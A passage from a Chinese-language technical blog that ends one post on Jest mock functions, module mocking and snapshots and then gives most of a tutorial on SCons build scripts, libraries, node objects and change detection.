<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> filterMock = jest.<span class="title function_">fn</span>();</span><br><span class="line"></span><br><span class="line">filterMock.<span class="title function_">mockReturnValueOnce</span>(<span class="literal">true</span>).<span class="title function_">mockReturnValueOnce</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> result = [<span class="number">11</span>, <span class="number">12</span>].<span class="title function_">filter</span>(<span class="function"><span class="params">num</span> =&gt;</span> <span class="title function_">filterMock</span>(num));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(filterMock.<span class="property">mock</span>.<span class="property">calls</span>[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(filterMock.<span class="property">mock</span>.<span class="property">calls</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="comment">// [11]</span></span><br><span class="line"><span class="comment">// 11</span></span><br><span class="line"><span class="comment">// 12</span></span><br></pre></td></tr></table></figure>

<h3 id="模拟模块的返回值"><a href="#模拟模块的返回值" class="headerlink" title="模拟模块的返回值"></a>模拟模块的返回值</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// users.js</span></span><br><span class="line"><span class="comment">// 此处假设 user.js 调用了 axios 模块，调用其中的 get 方法获取用户数据</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Class</span> <span class="title class_">Users</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">all</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> axios.<span class="title function_">get</span>(<span class="string">&#x27;/user.json&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">resp</span> =&gt;</span> resp.<span class="property">data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// user.test.js</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Users</span> <span class="keyword">from</span> <span class="string">&#x27;./users.js&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span>;</span><br><span class="line"></span><br><span class="line">jest.<span class="title function_">mock</span>(<span class="string">&#x27;axios&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;should fetch users&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> users = [&#123;<span class="attr">name</span>: <span class="string">&#x27;bob&#x27;</span>&#125;];</span><br><span class="line">    <span class="keyword">const</span> resp = &#123;<span class="attr">data</span>: users&#125;; <span class="comment">// 做了个假数据</span></span><br><span class="line">    axios.<span class="property">get</span>.<span class="title function_">mockResolvedValue</span>(resp); <span class="comment">// 将假数据传进去</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Users</span>.<span class="title function_">all</span>().<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> <span class="title function_">expect</span>(data).<span class="title function_">toEqual</span>(users));</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="模拟模块的实现"><a href="#模拟模块的实现" class="headerlink" title="模拟模块的实现"></a>模拟模块的实现</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo.js</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test.js</span></span><br><span class="line">jest.<span class="title function_">mock</span>(<span class="string">&#x27;../foo&#x27;</span>); <span class="comment">// foo 模块已经被伪装</span></span><br><span class="line"><span class="keyword">const</span> foo = <span class="built_in">require</span>(<span class="string">&#x27;../foo&#x27;</span>); <span class="comment">// 此处调用的 foo 已经是一个模拟函数</span></span><br><span class="line"></span><br><span class="line">foo.<span class="title function_">mockImplementation</span>(<span class="function">() =&gt;</span> <span class="number">42</span>); <span class="comment">// 定义 foo 的行为</span></span><br><span class="line"><span class="title function_">foo</span>();</span><br><span class="line"><span class="comment">// &gt; 42</span></span><br></pre></td></tr></table></figure>

<p>模拟多次调用时，函数表现不同的行为</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mockFn = jest.<span class="title function_">fn</span>()</span><br><span class="line">	.<span class="title function_">mockImplementationOnce</span>(<span class="function"><span class="params">cb</span> =&gt;</span> <span class="title function_">cb</span>(<span class="literal">null</span>, <span class="literal">true</span>))</span><br><span class="line">	.<span class="title function_">mockImplementationOnce</span>(<span class="function"><span class="params">cb</span> =&gt;</span> <span class="title function_">cb</span>(<span class="literal">null</span>, <span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_">mockFn</span>(<span class="function">(<span class="params">err, val</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(val));</span><br><span class="line"><span class="comment">// &gt; true</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">mockFn</span>(<span class="function">(<span class="params">err, val</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(val));</span><br><span class="line"><span class="comment">// &gt; false</span></span><br></pre></td></tr></table></figure>

<p>模块多次调用时，不同的行为 + 默认的行为</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> myMockFn = jest</span><br><span class="line">  .<span class="title function_">fn</span>(<span class="function">() =&gt;</span> <span class="string">&#x27;default&#x27;</span>)</span><br><span class="line">  .<span class="title function_">mockImplementationOnce</span>(<span class="function">() =&gt;</span> <span class="string">&#x27;first call&#x27;</span>)</span><br><span class="line">  .<span class="title function_">mockImplementationOnce</span>(<span class="function">() =&gt;</span> <span class="string">&#x27;second call&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">myMockFn</span>(), <span class="title function_">myMockFn</span>(), <span class="title function_">myMockFn</span>(), <span class="title function_">myMockFn</span>());</span><br><span class="line"><span class="comment">// &gt; &#x27;first call&#x27;, &#x27;second call&#x27;, &#x27;default&#x27;, &#x27;default&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="为模拟函数添加名称"><a href="#为模拟函数添加名称" class="headerlink" title="为模拟函数添加名称"></a>为模拟函数添加名称</h3><p>通过定义模拟的函数的名称，在测试的输出信息中，能够更清晰的定位哪个函数出错了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mockFn = jest.<span class="title function_">fn</span>()</span><br><span class="line">	.<span class="title function_">mockReturnValue</span>(<span class="string">&#x27;default&#x27;</span>)</span><br><span class="line">	.<span class="title function_">mockImplementation</span>(<span class="function"><span class="params">scalar</span> =&gt;</span> scalar + <span class="number">42</span>)</span><br><span class="line">	.<span class="title function_">mockName</span>(<span class="string">&#x27;add42&#x27;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h2><p>用来比对界面是否与预期的一致；典型的使用方法是给某个 UI 组件预先存一份快照，然后与测试过程中生成的界面进行比对，检查二者是否一致，若一致，表示应用正常；如不一致，说明界面出现了意外的变化，此时有可能是应用出现异常，或者 快照本身需要更新；</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/07/Jest/" data-id="cm1c2i80j000lpkhp0i1jhjbn" data-title="Jest" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/javascript/" rel="tag">javascript</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%BD%AF%E4%BB%B6/" rel="tag">软件</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-scons 用法" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/17/scons%20%E7%94%A8%E6%B3%95/" class="article-date">
  <time class="dt-published" datetime="2021-01-17T12:16:00.000Z" itemprop="datePublished">2021-01-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/17/scons%20%E7%94%A8%E6%B3%95/">scons 用法</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. 基本概念</h2><p>SConstruct 是一个 Python 脚本，作用类似于 Makefile，我们通过它来告诉 Scons 要构建什么东西</p>
<h2 id="2-常用命令"><a href="#2-常用命令" class="headerlink" title="2. 常用命令"></a>2. 常用命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 表示读取 SConstruct 脚本文件，开始构建</span></span><br><span class="line">scons</span><br><span class="line"><span class="comment"># -c 选项表示清理现场，将构建出来的东西删除掉</span></span><br><span class="line">scons -c</span><br><span class="line"><span class="comment"># -Q 选项表示安静模式，即不打印构建过程中的提示信息</span></span><br><span class="line">scons -Q</span><br></pre></td></tr></table></figure>

<h2 id="3-简单构建"><a href="#3-简单构建" class="headerlink" title="3. 简单构建"></a>3. 简单构建</h2><h3 id="单个源文件"><a href="#单个源文件" class="headerlink" title="单个源文件"></a>单个源文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Program 用来告知 Scons 要构建可执行文件，参数即是源代码</span></span><br><span class="line">Program(<span class="string">&#x27;hello.c&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果要指代可执行文件的名字，可写在第一个参数上</span></span><br><span class="line">Program(<span class="string">&#x27;my_hello&#x27;</span>,  <span class="string">&#x27;hello.c&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Object 表示要构建目标文件</span></span><br><span class="line">Object(<span class="string">&#x27;hello.c&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="多个源文件"><a href="#多个源文件" class="headerlink" title="多个源文件"></a>多个源文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果源代码有多个文件，只需将它们放在一个列表中即可</span></span><br><span class="line">Program([<span class="string">&#x27;prog.c&#x27;</span>, <span class="string">&#x27;file1.c&#x27;</span>, <span class="string">&#x27;file2.c&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Program 默认以列表第一个元素为最终编译结果的可执行文件的文件名，但是可以自定义</span></span><br><span class="line">Program(<span class="string">&#x27;my_prog&#x27;</span>, [<span class="string">&#x27;prog.c&#x27;</span>, <span class="string">&#x27;file1.c&#x27;</span>, <span class="string">&#x27;file2.c&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果文件很多个，可以使用关键字和 Glob 命令进行匹配</span></span><br><span class="line"><span class="comment"># 通配符包括星号 *，问号 ?，以及部分关键字如 [abc] 表示任意满足 a, b 或  c 的文件均可</span></span><br><span class="line"><span class="comment"># 也可以使用 [!abc] 进行排除，即不包括以上几个字母的，即是目标</span></span><br><span class="line">Program(<span class="string">&#x27;prog&#x27;</span>, Glob(<span class="string">&#x27;*.c&#x27;</span>))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>事实上，源代码文件在 Scons 内部都是当作列表来处理，单个文件的情况，会自动添加方括号而已；为了统一，建议还是都加上方括号比较好，同时也可以避免 Python 解释器报语法错误</p>
</blockquote>
<h3 id="自动加引号"><a href="#自动加引号" class="headerlink" title="自动加引号"></a>自动加引号</h3><p>当有多个文件时，需要为每个文件打上双引号，如果文件一多，确实工作量不小；Scons 额外提供了一个 Split 名称，可以为文件自动添加引号，使用方法如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Split 函数自动添加引号，文件名之间只需要使用空格分隔即可</span></span><br><span class="line">Program(<span class="string">&#x27;prog&#x27;</span>, Split(<span class="string">&#x27;main.c  file1.c file2.c&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以用一个变量来代表多个文件的列表</span></span><br><span class="line">src_files = Split(<span class="string">&#x27;main.c file1.c file2.c&#x27;</span>)</span><br><span class="line">Program(<span class="string">&#x27;program&#x27;</span>, src_files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件名之间有多个空格也没有关系</span></span><br><span class="line"><span class="comment"># 此处用三个引号是为了符合 Python 对多行字符串的格式要求</span></span><br><span class="line">src_files = Split(<span class="string">&quot;&quot;&quot;main.c</span></span><br><span class="line"><span class="string">                            file1.c</span></span><br><span class="line"><span class="string">                            file2.c&quot;&quot;&quot;</span>)</span><br><span class="line">Program(<span class="string">&#x27;program&#x27;</span>, src_files)</span><br></pre></td></tr></table></figure>

<h3 id="指定参数名"><a href="#指定参数名" class="headerlink" title="指定参数名"></a>指定参数名</h3><p>Program 支持指定参数名</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">src_files = Split(<span class="string">&#x27;main.c file1.c file2.c&#x27;</span>)</span><br><span class="line">Program(target = <span class="string">&#x27;program&#x27;</span>, source = src_files)</span><br></pre></td></tr></table></figure>

<h3 id="多个编译目标"><a href="#多个编译目标" class="headerlink" title="多个编译目标"></a>多个编译目标</h3><p>如果想在同一个 scons 文件中编译多个可执行文件，只需多次调用 Program 函数即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Program(<span class="string">&#x27;foo.c&#x27;</span>)</span><br><span class="line">Program(<span class="string">&#x27;bar&#x27;</span>, [<span class="string">&#x27;bar1.c&#x27;</span>, <span class="string">&#x27;bar2.c&#x27;</span>])</span><br></pre></td></tr></table></figure>

<h3 id="多目标共享源文件"><a href="#多目标共享源文件" class="headerlink" title="多目标共享源文件"></a>多目标共享源文件</h3><p>办法1：只需要将共享的文件放入源文件列表即可 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 此处  common1.c 和 common2.c 这两个文件是共享的</span></span><br><span class="line">Program(Split(<span class="string">&#x27;foo.c common1.c common2.c&#x27;</span>))</span><br><span class="line">Program(<span class="string">&#x27;bar&#x27;</span>, Split(<span class="string">&#x27;bar1.c bar2.c common1.c common2.c&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果引用的次数很多，简单的做成变量进行引用即可</span></span><br><span class="line">common = [<span class="string">&#x27;common1.c&#x27;</span>, <span class="string">&#x27;common2.c&#x27;</span>]</span><br><span class="line">foo_files = [<span class="string">&#x27;foo.c&#x27;</span>] + common</span><br><span class="line">bar_files = [<span class="string">&#x27;bar1.c&#x27;</span>, <span class="string">&#x27;bar2.c&#x27;</span>] + common</span><br><span class="line">Program(<span class="string">&#x27;foo&#x27;</span>, foo_files)</span><br><span class="line">Program(<span class="string">&#x27;bar&#x27;</span>, bar_files)</span><br></pre></td></tr></table></figure>

<p>办法2：将共享的文件做为库，由不同的目标进行引号</p>
<h2 id="4-构建和链接库"><a href="#4-构建和链接库" class="headerlink" title="4. 构建和链接库"></a>4. 构建和链接库</h2><h3 id="构建库"><a href="#构建库" class="headerlink" title="构建库"></a>构建库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Library 函数即可构建库</span></span><br><span class="line">Library(<span class="string">&#x27;foo&#x27;</span>, [<span class="string">&#x27;f1.c&#x27;</span>, <span class="string">&#x27;f2.c&#x27;</span>, <span class="string">&#x27;f3.c&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 除了指定源文件外，也可以在文件列表中加入目标文件</span></span><br><span class="line">Library(<span class="string">&#x27;foo&#x27;</span>, [<span class="string">&#x27;f1.c&#x27;</span>, <span class="string">&#x27;f2.o&#x27;</span>, <span class="string">&#x27;f3.c&#x27;</span>, <span class="string">&#x27;f4.o&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Library 函数默认构建静态库，同时还可以使用 StaticLibrary 函数显示的指示要构建静态库</span></span><br><span class="line">StaticLibrary(<span class="string">&#x27;foo&#x27;</span>, [<span class="string">&#x27;f1.c&#x27;</span>, <span class="string">&#x27;f2.c&#x27;</span>, <span class="string">&#x27;f3.c&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建动态库</span></span><br><span class="line">SharedLibrary(<span class="string">&#x27;foo&#x27;</span>, [<span class="string">&#x27;f1.c&#x27;</span>, <span class="string">&#x27;f2.c&#x27;</span>, <span class="string">&#x27;f3.c&#x27;</span>])</span><br></pre></td></tr></table></figure>

<h3 id="链接库"><a href="#链接库" class="headerlink" title="链接库"></a>链接库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过在 LIBS 参数中指定库的名称，并在 LIBPATH 指定库的路径，即可完成对库的链接</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 此处先构建一个静态库</span></span><br><span class="line">Library(<span class="string">&#x27;foo&#x27;</span>, [<span class="string">&#x27;f1.c&#x27;</span>, <span class="string">&#x27;f2.c&#x27;</span>, <span class="string">&#x27;f3.c&#x27;</span>]) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 此处告知要链接的静态库名称和路径</span></span><br><span class="line"><span class="comment"># 注意：只需要提供库的名称即可，无须在库的名称前面加上 lib 前缀，或者 .a 后缀什么的</span></span><br><span class="line">Program(<span class="string">&#x27;prog.c&#x27;</span>, LIBS=[<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>], LIBPATH=<span class="string">&#x27;.&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="查找库"><a href="#查找库" class="headerlink" title="查找库"></a>查找库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通常情况下，链接器只在系统默认的文件中查找库，但是通过 LIBPATH 参数</span></span><br><span class="line"><span class="comment"># 链接器会在指定的文件夹中查找库</span></span><br><span class="line">Program(<span class="string">&#x27;prog.c&#x27;</span>, LIBS = <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">                        			LIBPATH = [<span class="string">&#x27;/usr/lib&#x27;</span>, <span class="string">&#x27;/usr/local/lib&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不同的路径可以使用逗号分隔，组成列表；也可以使用冒号连接成单个字符串</span></span><br><span class="line">LIBPATH = <span class="string">&#x27;/usr/lib:/usr/local/lib&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="5-节点对象"><a href="#5-节点对象" class="headerlink" title="5. 节点对象"></a>5. 节点对象</h2><p>在内部实现上，Scons 将所有的文件和文件夹都当作一个 NodeObject 节点对象来对待；</p>
<h3 id="构建方法的返回值是节点列表"><a href="#构建方法的返回值是节点列表" class="headerlink" title="构建方法的返回值是节点列表"></a>构建方法的返回值是节点列表</h3><p>所有的构建方法都会返回一个节点列表，用来表示将要构建的目标文件或者参与构建的源文件，返回的这个列表可以作为参数，传递给其他构建方法；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设我们需要为两个目标文件指定不同的构建参数，因此我们为它们调用了各自的 Object 方法</span></span><br><span class="line">hello_list = Object(<span class="string">&#x27;hello.c&#x27;</span>, CCFLAGS=<span class="string">&#x27;-DHELLO&#x27;</span>)</span><br><span class="line">goodbye_list = Object(<span class="string">&#x27;goodbye.c&#x27;</span>, CCFLAGS=<span class="string">&#x27;-DGOODBYE&#x27;</span>)</span><br><span class="line">Program(hello_list + goodbye_list)</span><br></pre></td></tr></table></figure>

<h3 id="显式创建文件和目录的节点"><a href="#显式创建文件和目录的节点" class="headerlink" title="显式创建文件和目录的节点"></a>显式创建文件和目录的节点</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建文件节点和创始目录节点的方法不同</span></span><br><span class="line"><span class="comment"># 创建文件节点使用 File 方法</span></span><br><span class="line">hello_c = File(<span class="string">&#x27;hello.c&#x27;</span>)</span><br><span class="line">Program(hello_c)</span><br><span class="line"><span class="comment"># 创建目录节点使用 Dir 方法</span></span><br><span class="line">classes = Dir(<span class="string">&#x27;classes&#x27;</span>)</span><br><span class="line">Java(classes, <span class="string">&#x27;src&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>正常情况下，并不需要手动创建节点，因为构建方法会自动帮助创建；仅在需要显式传递节点参数给构建方法时使用；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Entry 函数可以根据参数类型，创建文件节点或者目录节点</span></span><br><span class="line">xyzzy = Entry(<span class="string">&#x27;xyzzy&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="打印节点的文件名称"><a href="#打印节点的文件名称" class="headerlink" title="打印节点的文件名称"></a>打印节点的文件名称</h3><p>由于构建方法返回的是一个节点列表，因此如果要打印文件名称，很可能需要遍历它，或者使用索引访问它</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">object_list = Object(<span class="string">&#x27;hello.c&#x27;</span>)</span><br><span class="line">program_list = Program(object_list)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;The object file is:&quot;</span>, object_list[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;The program file is:&quot;</span>, program_list[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># 事实上此处的 object_list 是节点列表，仅仅是 print 函数将节点转成了字符串来代表文件名</span></span><br></pre></td></tr></table></figure>

<h3 id="获取节点文件名"><a href="#获取节点文件名" class="headerlink" title="获取节点文件名"></a>获取节点文件名</h3><p>使用 Python 内置的 str 函数即可方便的将一个节点转成一个文件名，例如可以用来判断一个文件是否存在</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line">program_list = Program(<span class="string">&#x27;hello.c&#x27;</span>)</span><br><span class="line">program_name = <span class="built_in">str</span>(program_list[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(program_name):</span><br><span class="line">    <span class="built_in">print</span> program_name, <span class="string">&quot;does not exist!&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="获取节点路径"><a href="#获取节点路径" class="headerlink" title="获取节点路径"></a>获取节点路径</h3><p>env 对象有一个 GetBuildPath方法，可以用来获取单个或多个节点的路径</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个 env 对象，它代表一个环境，在这个环境中，有一个环境变量的 VAR 的值为 value</span></span><br><span class="line">env=Environment(VAR=<span class="string">&quot;value&quot;</span>)</span><br><span class="line"><span class="comment"># 生成一个文件节点</span></span><br><span class="line">n=File(<span class="string">&quot;foo.c&quot;</span>)</span><br><span class="line"><span class="comment"># 调用 env 对象的 GetBuildPath 方法，获取节点列表的路径列表</span></span><br><span class="line"><span class="built_in">print</span> env.GetBuildPath([n, <span class="string">&quot;sub/dir/$VAR&quot;</span>])</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印结果为</span></span><br><span class="line">[&#x27;foo.c&#x27;, &#x27;sub/dir/value&#x27;]</span><br></pre></td></tr></table></figure>

<p>除了使用 env 对象的 GetBuildPath 方法外，也有一个函数版本的 GetBuildPath ，它使用全局环境；</p>
<h2 id="6-依赖出现更新"><a href="#6-依赖出现更新" class="headerlink" title="6. 依赖出现更新"></a>6. 依赖出现更新</h2><h3 id="判断文件是否更新"><a href="#判断文件是否更新" class="headerlink" title="判断文件是否更新"></a>判断文件是否更新</h3><p>如果源文件的内容没有出现更新，是 Scons 不会重复构建已经完成构建的文件，这样可以节省大量的构建时间，不需要每次都从头开始构建每一文件；</p>
<h4 id="使用-MD5-判断"><a href="#使用-MD5-判断" class="headerlink" title="使用 MD5 判断"></a>使用 MD5 判断</h4><p>SCons 使用 MD5 来判断某个文件的内容是否发生了更新，当然，也可以另外配置让其使用文件时间戳来判断，甚至可以使用单独的 python 函数来进行各种自定义的判断；</p>
<p>使用 MD5 有一个好处是它只判断内容中的正文部分，同时忽略注释部分，即只要正文内容的构建结果不会出现变化，则 SCons 就不会重现构建它；</p>
<h4 id="使用时间戳判断"><a href="#使用时间戳判断" class="headerlink" title="使用时间戳判断"></a>使用时间戳判断</h4><p>如果想使用时间戳来判断文件是否发生更新，则只需要调用 Decider 函数进行设置即可</p>
